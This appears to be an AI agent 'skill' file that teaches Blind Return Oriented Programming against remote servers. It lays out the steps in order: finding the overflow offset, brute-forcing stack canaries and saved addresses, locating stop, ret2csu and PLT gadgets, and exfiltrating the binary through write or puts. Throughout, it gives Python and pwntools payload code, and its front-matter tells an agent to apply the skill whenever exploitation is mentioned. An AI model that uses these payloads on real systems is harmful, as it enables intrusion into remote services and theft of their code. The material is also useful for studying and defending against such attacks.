---
name: brop-blind-return-oriented-programming
description: How to perform Blind Return Oriented Programming (BROP) attacks on vulnerable binaries without any information about the binary. Use this skill whenever the user mentions blind exploitation, BROP, return-oriented programming without binary info, stack overflow without binary knowledge, or needs to exploit a server that restarts after crashes. This skill covers finding vulnerable offsets, brute-forcing canaries, locating ROP gadgets, finding PLT entries, and exfiltrating binary data.
---

# Blind Return Oriented Programming (BROP)

A technique to abuse ROP via buffer overflow **without any information about the vulnerable binary**. This attack requires:

- A stack vulnerability with known trigger method
- A server application that restarts after crashes

## Attack Methodology

### Step 1: Find Vulnerable Offset

Send incrementally larger payloads until server malfunction is detected:

```python
# Start with small payload and increase
for length in range(100, 10000, 100):
    payload = b'A' * length
    send(payload)
    if server_crashes():
        print(f"Vulnerable offset found around: {length}")
        break
```

### Step 2: Brute-Force Canary

The stack canary protects against buffer overflows. Brute-force it by sending different values until the crash behavior changes:

```python
# Canary is typically 8 bytes on x64
# Brute-force byte by byte for efficiency
for byte in range(256):
    payload = b'A' * offset + bytes([byte])
    send(payload)
    if not server_crashes():
        canary += bytes([byte])
        break
```

See: `BF Forked & Threaded Stack Canaries` for detailed techniques.

### Step 3: Brute-Force RBP and RIP Addresses

Leak the saved RBP and RIP addresses from the stack:

```python
# These addresses are stored after the canary
# Brute-force to find valid addresses
payload = b'A' * offset + canary + rbp + rip
```

See: `Bypassing Canary and PIE` for detailed techniques.

### Step 4: Find the Stop Gadget

A stop gadget confirms ROP execution without crashing. It's positioned at the end of the ROP chain:

```python
# Stop gadget pattern
payload = b'A' * offset + canary + rbp + ADDR + 0xdead * 6 + STOP
```

If STOP executes, the address popped 6 registers from the stack.

### Step 5: Find BROP Gadget (ret2csu)

The ret2csu gadget has a unique signature - it pops 6 registers. This allows control of `rsi` and `rdi`:

**Key gadgets:**
- `pop rsi; pop r15; ret` (BROP + 0x7)
- `pop rdi; ret` (BROP + 0x9)

**Detection pattern:**
```python
# Test if address pops 6 registers
payload1 = b'A' * offset + canary + rbp + ADDR + 0xdead * 6 + STOP
# If STOP executes, ADDR pops 6 registers

# Confirm by testing without the 6 registers
payload2 = b'A' * offset + canary + rbp + ADDR
# Should NOT execute STOP
```

Once ret2csu is found, infer addresses of `rsi` and `rdi` control gadgets.

### Step 6: Find PLT Table

The PLT (Procedure Linkage Table) can be searched from:
- `0x400000` (non-PIE binaries)
- Leaked RIP address (PIE binaries)

**PLT characteristics:**
- Entries separated by 16 bytes (0x10)
- Function calls don't crash even with wrong arguments
- Entry + 0x6 also doesn't crash (first code executed)

**Detection pattern:**
```python
# Test PLT entry
payload = b'A' * offset + canary + rbp + ADDR + STOP
# No crash = valid PLT entry

# Confirm with offset
payload = b'A' * offset + canary + rbp + (ADDR + 0x6) + STOP
# No crash = confirmed PLT entry

# Check next entry
payload = b'A' * offset + canary + rbp + (ADDR + 0x10) + STOP
# No crash = next PLT entry
```

### Step 7: Find strcmp Function

`strcmp` sets `rdx` to the string length (third argument). We need `rdx > 0` for later `write` calls.

**Detection using strcmp behavior:**
- `strcmp(<non-read-addr>, <non-read-addr>)` → crash
- `strcmp(<non-read-addr>, <read-addr>)` → crash
- `strcmp(<read-addr>, <non-read-addr>)` → crash
- `strcmp(<read-addr>, <read-addr>)` → no crash

**PLT slow path probing:**
```python
# PLT + 0xb calls dl_resolve
# Follow with entry number to probe

# strcmp(<read-addr>, <read-addr>) - no crash
payload = (b'A' * offset + canary + rbp + 
           (BROP + 0x9) + RIP + 
           (BROP + 0x7) + RIP + 
           p64(0x0) + 
           (PLT + 0xb) + 
           p64(ENTRY) + 
           STOP)
```

**Register gadget offsets:**
- `BROP + 0x7` → `pop RSI; pop R15; ret`
- `BROP + 0x9` → `pop RDI; ret`
- `PLT + 0xb` → `dl_resolve` call

### Step 8: Find Write Function

Exfiltrate binary data using `write`, `puts`, or `dprintf`.

**Detection patterns:**

**puts(data):**
```python
payload = (b'A' * offset + canary + rbp + 
           (BROP + 0x9) + RIP + 
           (BROP + 0x7) + p64(0) + 
           p64(0) + 
           (PLT + 0xb) + 
           p64(ENTRY) + 
           STOP)
# Data printed = puts found
```

**dprintf(fd, data):**
```python
payload = (b'A' * offset + canary + rbp + 
           (BROP + 0x9) + FD + 
           (BROP + 0x7) + RIP + 
           p64(0x0) + 
           (PLT + 0xb) + 
           p64(ENTRY) + 
           STOP)
# Data printed = dprintf found
```

**write(fd, data, len):**
```python
payload = (b'A' * offset + canary + rbp + 
           (BROP + 0x9) + RIP + 
           (BROP + 0x7) + (RIP + 0x1) + 
           p64(0x0) + 
           (PLT + 0xb) + p64(STRCMP_ENTRY) + 
           (BROP + 0x9) + FD + 
           (BROP + 0x7) + RIP + 
           p64(0x0) + 
           (PLT + 0xb) + 
           p64(ENTRY) + 
           STOP)
# Data printed = write found
```

**Finding file descriptor:**
- Create multiple connections to the server
- Use high FD numbers hoping to match socket connections

## Payload Construction Template

```python
from pwn import *

def build_brop_payload(offset, canary, rbp, rip, gadget, args, stop):
    """Build a BROP payload with controlled arguments"""
    payload = b'A' * offset
    payload += canary
    payload += rbp
    payload += gadget  # ret2csu or similar
    
    # Add arguments (rsi, rdi control)
    for arg in args:
        payload += arg
    
    payload += stop
    return payload
```

## Common Pitfalls

1. **Server restart timing**: Ensure you wait for server to restart between payloads
2. **Canary randomization**: Some systems re-randomize canary on each restart
3. **PIE binaries**: Use leaked RIP to calculate PLT base address
4. **ASLR**: May need to leak addresses before exploitation
5. **Connection limits**: Too many connections may trigger rate limiting

## Tools and Resources

- **Bropper**: [https://github.com/Hakumarachi/Bropper](https://github.com/Hakumarachi/Bropper)
- **Original Paper**: [BROP - Blind Return Oriented Programming](https://www.scs.stanford.edu/brop/bittau-brop.pdf)
- **CTF Recipes**: [BROP Guide](https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/blind-return-oriented-programming-brop)

## When to Use This Skill

Use BROP when:
- You have a stack overflow but no binary information
- The target server restarts after crashes
- Traditional ROP is not possible due to lack of binary knowledge
- You need to exfiltrate binary data for further exploitation
- Working with remote services where you can't download the binary

## Next Steps After BROP

Once you've exfiltrated the binary:
1. Analyze the binary locally with Ghidra/IDA
2. Build a proper ROP chain with known addresses
3. Execute the final exploit with full binary knowledge
4. Consider using the exfiltrated data to find additional vulnerabilities
